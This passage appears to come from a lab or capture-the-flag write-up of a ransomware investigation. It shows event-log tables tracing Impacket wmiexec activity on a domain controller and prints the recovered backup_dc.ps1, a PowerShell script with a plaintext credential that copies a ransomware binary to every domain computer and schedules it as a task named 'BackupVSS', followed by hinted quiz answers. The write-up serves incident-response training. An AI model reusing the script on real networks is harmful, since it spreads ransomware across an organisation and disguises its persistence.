| Feb 25, 2024 @ 13:14:43.620 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-21                          |
| Feb 25, 2024 @ 13:14:43.803 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-21                          |
| Feb 25, 2024 @ 13:14:50.030 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-21                          |
| Feb 25, 2024 @ 13:14:50.048 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-21                          |
| Feb 25, 2024 @ 13:14:57.869 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-20                          |
| Feb 25, 2024 @ 13:15:00.578 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-20                          |
| Feb 25, 2024 @ 13:15:01.185 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-20                          |
| Feb 25, 2024 @ 13:15:06.005 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-20                          |
| Feb 25, 2024 @ 13:15:06.021 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-20                          |

It looks like there's connections to the DC. Let's take a closer look at what's happening in this login session:

```
host.name: dc AND winlog.event_data.LogonId: 0x488835
```

| Time                        | winlog.event_data.ParentCommandLine                                                                                                                                                               | winlog.event_data.CommandLine                                                                                                                                                                     |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Feb 25, 2024 @ 13:13:21.331 | C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding                                                                                                                                         | cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1708895597.7543964 2>&1                                                                                                                                |
| Feb 25, 2024 @ 13:13:21.335 | cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1708895597.7543964 2>&1                                                                                                                                | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1                                                                                                                                           |
| Feb 25, 2024 @ 13:13:22.951 | C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding                                                                                                                                         | cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1708895597.7543964 2>&1                                                                                                                                 |
| Feb 25, 2024 @ 13:13:22.955 | cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1708895597.7543964 2>&1                                                                                                                                 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1                                                                                                                                           |
| Feb 25, 2024 @ 13:14:27.440 | C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding                                                                                                                                         | cmd.exe /Q /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\ace\\Desktop\\backup_dc.ps1 1> \\127.0.0.1\ADMIN$\__1708895597.7543964 2>&1 |
| Feb 25, 2024 @ 13:14:27.443 | cmd.exe /Q /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\ace\\Desktop\\backup_dc.ps1 1> \\127.0.0.1\ADMIN$\__1708895597.7543964 2>&1 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1                                                                                                                                           |
| Feb 25, 2024 @ 13:14:27.487 | cmd.exe /Q /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\ace\\Desktop\\backup_dc.ps1 1> \\127.0.0.1\ADMIN$\__1708895597.7543964 2>&1 | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\ace\\Desktop\\backup_dc.ps1                                                               |

These look like distinct artifacts from Impacket's wmiexec.py with a semi-interactive shell. It is establishing an SMB connection to create a file, executing a command, then writing the file. I'm curious to know more what this PowerShell script is doing. I ran a query: `backup_dc.ps1` just to skim the results, and noticed there was partial pieces of the script in `winlog.event_data.param1`. It was more straightforward to just look at:

```
host.name: dc AND event.code: 4104
```

There were 34 hits, and here are the two scripts I thought were relevant to the investigation. This first one is backup_dc.ps1:

```
$sourceLetsLockYouDown = "\\10.0.0.4\srv\nfs\letslockyoudown.exe"
$sourceTinyBat = "\\10.0.0.4\srv\nfs\tiny.bat"
$sourcePublicPem = "\\10.0.0.4\srv\nfs\public.pem"
$destinationFolder = "C:\Temp"
$scriptPath = "$destinationFolder\YourScript.ps1" # Ensure this script is also copied or available in the destination folder

# Retrieve computer names from Active Directory
$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name

foreach ($computer in $computers) {
  if (Test-Connection -ComputerName $computer -Count 2 -Quiet) {
      Invoke-Command -ComputerName $computer -ScriptBlock {
      param($destinationFolder, $sourceLetsLockYouDown, $sourceTinyBat, $sourcePublicPem, $scriptPath)
      
      # Ensure the destination folder exists
      if (-not (Test-Path -Path $destinationFolder)) {
        New-Item -ItemType Directory -Path $destinationFolder -Force
      }
      
      # Copy files
      Copy-Item -Path $sourceLetsLockYouDown -Destination "$destinationFolder\letslockyoudown.exe" -Force
      Copy-Item -Path $sourceTinyBat -Destination "$destinationFolder\tiny.bat" -Force
      Copy-Item -Path $sourcePublicPem -Destination "$destinationFolder\public.pem" -Force
      
      # Execute tiny.bat
      Start-Process -FilePath "cmd.exe" -ArgumentList "/c $destinationFolder\tiny.bat" -NoNewWindow -Wait
      
      # Schedule letslockyoudown.exe to run every 10 minutes
      $letsLockAction = New-ScheduledTaskAction -Execute "$destinationFolder\letslockyoudown.exe"
      #$letsLockTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([timespan]::MaxValue)
      $letsLockTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
      $letsLockTaskName = "BackupVSS"
      $principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
      Register-ScheduledTask -TaskName $letsLockTaskName -Action $letsLockAction -Trigger $letsLockTrigger -Principal $principal -Force
# -User "NT AUTHORITY\SYSTEM" -RunLevel Highest â€“Force
# Register-ScheduledTask -TaskName $letsLockTaskName -Action $letsLockAction -Trigger $letsLockTrigger -User "SYSTEM" -RunLevel Highest -Force
      # Define the action for the PowerShell script task
      # $psAction = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
      # Define the trigger for the PowerShell script task (every 5 minutes)
      # $psTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([timespan]::MaxValue)
      # Register the scheduled task for the PowerShell script
      # $psTaskName = "AuthenticateToWin11Task"
      # $psTaskDescription = "Authenticates to Win11 every 5 minutes for all users"
      # Register-ScheduledTask -TaskName $psTaskName -Action $psAction -Trigger $psTrigger -Principal (New-ScheduledTaskPrincipal -UserId "BUILTIN\Users" -RunLevel Highest) -Description $psTaskDescription â€“Force
      
    } -ArgumentList $destinationFolder, $sourceLetsLockYouDown, $sourceTinyBat, $sourcePublicPem, $scriptPath -Credential (New-Object System.Management.Automation.PSCredential ('aceresponder\ace', (ConvertTo-SecureString 'P@$$w0rd!12345' -AsPlainText -Force)))
  }
}  
```

This second one was executed remotely:

```
      param($destinationFolder, $sourceLetsLockYouDown, $sourceTinyBat, $sourcePublicPem, $scriptPath)

# Ensure the destination folder exists
if (-not (Test-Path -Path $destinationFolder)) {
New-Item -ItemType Directory -Path $destinationFolder -Force
}

# Copy files
Copy-Item -Path $sourceLetsLockYouDown -Destination "$destinationFolder\letslockyoudown.exe" -Force
Copy-Item -Path $sourceTinyBat -Destination "$destinationFolder\tiny.bat" -Force
Copy-Item -Path $sourcePublicPem -Destination "$destinationFolder\public.pem" -Force

# Execute tiny.bat
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $destinationFolder\tiny.bat" -NoNewWindow -Wait

# Schedule letslockyoudown.exe to run every 10 minutes
$letsLockAction = New-ScheduledTaskAction -Execute "$destinationFolder\letslockyoudown.exe"
#$letsLockTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([timespan]::MaxValue)
$letsLockTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
$letsLockTaskName = "BackupVSS"
$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
Register-ScheduledTask -TaskName $letsLockTaskName -Action $letsLockAction -Trigger $letsLockTrigger -Principal $principal -Force
# -User "NT AUTHORITY\SYSTEM" -RunLevel Highest â€“Force
# Register-ScheduledTask -TaskName $letsLockTaskName -Action $letsLockAction -Trigger $letsLockTrigger -User "SYSTEM" -RunLevel Highest -Force
# Define the action for the PowerShell script task
# $psAction = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
# Define the trigger for the PowerShell script task (every 5 minutes)
# $psTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([timespan]::MaxValue)
# Register the scheduled task for the PowerShell script
# $psTaskName = "AuthenticateToWin11Task"
# $psTaskDescription = "Authenticates to Win11 every 5 minutes for all users"
# Register-ScheduledTask -TaskName $psTaskName -Action $psAction -Trigger $psTrigger -Principal (New-ScheduledTaskPrincipal -UserId "BUILTIN\Users" -RunLevel Highest) -Description $psTaskDescription â€“Force
```

**Q11. Lateral Movement Technique: Which of the following best describes the technique the attacker used to execute on DC?**

See above!

**Q12. Ransomware Staging: What is the name of the script that distributed the ransomware to the domain?**

See the results of the query in question 10.

**Q13. Ransomware Staging 2: What best describes the technique used by `backup_dc.ps1` to distribute the ransomware to the domain?**

PowerShell remoting!

**Q14. Artifacts: Which of the following best describes the purpose of `tiny.bat`?**

We know what tiny.bat did from one of the queries we used to answer question 3!

**Q15. Task Name: What is the name of the scheduled task that executes the ransomware?**

We know this from the work we did in question 6.

**Q16. Ransom Note: Which program displays the ransom note on the user's desktop?**

See our work at the end of question 6.

**Q17. Impact: Assuming access can be restored to all systems, can the users' files be recovered without paying the ransom?**

I believe the answer is yes -- while the attacker messed with the Boot Configuration Data (BCD) store, which determines how the OS starts, it doesn't appear the disks were actually encrypted on the user workstations or the domain controller!
